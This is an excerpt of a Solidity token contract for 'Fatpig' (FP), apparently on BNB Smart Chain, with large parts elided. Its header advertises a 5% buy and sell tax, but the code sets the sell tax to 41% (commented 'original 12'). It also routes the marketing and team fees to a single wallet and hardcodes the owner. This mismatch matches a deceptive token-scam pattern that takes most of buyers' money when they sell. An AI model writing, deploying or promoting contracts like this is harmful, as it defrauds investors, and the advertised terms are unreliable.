...
/**
STEALTH LAUNCH AT 50 MEMBERS Based DEV
TG: https://t.me/Fatpigbsc
TAX: 
BUY : 5% 
SELL: 5%
*/
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x790Fba54Dcf4Cbf17F8E880736fdC39296ccadB9; // owner address
...
contract Fatpig is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Fatpigbsc";
    string private _symbol = "FP";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x5D665a458Aeac808C92eb3FC31c3eE5505198103); // Marketing Address
    address payable public teamWalletAddress = payable(0x5D665a458Aeac808C92eb3FC31c3eE5505198103); // Team Address
    ...
    uint256 public _totalTaxIfSelling = 41;  // original 12
